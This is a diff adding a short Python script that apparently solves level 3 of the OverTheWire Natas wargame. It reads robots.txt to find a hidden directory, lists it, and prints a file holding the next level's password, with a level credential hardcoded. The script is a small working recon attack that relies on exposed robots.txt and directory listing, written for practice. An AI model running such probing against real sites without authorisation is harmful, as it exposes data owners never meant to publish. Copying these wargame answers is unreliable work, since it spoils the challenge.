@@ -1,0 +1,27 @@
+import requests
+from requests.auth import HTTPBasicAuth
+from bs4 import BeautifulSoup
+# use dirb or gobuster and find /robots.txt file!
+
+url = 'http://natas3.natas.labs.overthewire.org/'
+password = '3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH' # change to actual password
+
+#req to robots.txt
+r1 = requests.get(url=url+'robots.txt', auth=HTTPBasicAuth('natas3', password=password))
+secret_path = r1.text.split()[3]
+
+#req to allow path
+r2 = requests.get(url=url+secret_path, auth=HTTPBasicAuth('natas3', password=password))
+soup = BeautifulSoup(r2.text, 'html.parser')
+
+#search secret_path
+list = []
+for a in soup.find_all('a'):
+    soup2 = BeautifulSoup(str(a), 'html.parser')
+    list.append(soup2.find('a').text)
+
+secret_path+=f'/{list[5]}'
+
+#req to secret_path
+r3 = requests.get(url=url+secret_path, auth=HTTPBasicAuth('natas3', password=password))
+print(r3.text)
